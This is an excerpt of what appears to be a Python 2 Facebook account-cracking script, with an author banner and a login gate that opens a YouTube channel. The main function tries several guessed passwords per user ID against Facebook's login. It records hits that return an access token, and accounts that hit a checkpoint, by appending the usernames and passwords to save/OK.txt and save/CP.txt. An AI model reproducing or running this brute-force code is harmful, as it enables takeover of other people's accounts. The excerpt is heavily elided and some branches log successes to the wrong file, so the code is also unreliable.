...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
            time.sleep(1)
            os.system('xdg-open https://youtube.com/channel/UCbJ0xeLBVqkMAC6FuCBsMCQ')
            os.system('clear')
            loop = 'false'
    else:
        os.system('xdg-open https://youtube.com/channel/UCbJ0xeLBVqkMAC6FuCBsMCQ')
...
\033[0;92m   __  __ _____    _  ___    _ _    _  _____ _    _          _
\033[0;92m  |  \/  |  __ \  | |/ / |  | | |  | |/ ____| |  | |   /\   | |
\033[0;92m  | \  / | |__) | | ' /| |__| | |  | | (___ | |__| |  /  \  | |
\033[0;92m  | |\/| |  _  /  |  < |  __  | |  | |\___ \|  __  | / /\ \ | |
\033[0;92m  | |  | | | \ \ _| . \| |  | | |__| |____) | |  | |/ ____ \| |____
\033[0;92m  |_|  |_|_|  \_(_)_|\_\_|  |_|\____/|_____/|_|  |_/_/    \_\______|
\033[1;97m--------------------------------------------------
\033[1;91m Author      :  KHUSHAL VALA
\033[1;91m GitHub      : https://github.com/Valakhushal
\033[1;91m Youtube    :  TECHNICAL TRICKS
\033[1;91m FACEBOOK  :  www.facebook.com/Vala.khushal.75
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;94m  [KHUSHAL_OK]  ' + k + c + user + '  ^  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m  [KHUSHAL_CP] ' + k + c + user + '  ^  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;96m  [KHUSHAL_OK] ' + k + c + user + '  ^  ' + pass2
                    okb = open('save/OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;95m  [KHUSHAL_CP] ' + k + c + user + '  ^  ' + pass2
                    cps = open('save/CP.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;96m  [KHUSHAL_OK]  ' + k + c + user + '  ^  ' + pass3
                        okb = open('save/CP.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m  [KHUSHAL_CP] ' + k + c + user + '  ^  ' + pass3
                        cps = open('save/CP.txt', 'a')
    ...
    raw_input('\n\x1b[1;97m[\x1b[1;98mVALA_menu_Back\x1b[1;95m]')
    login()
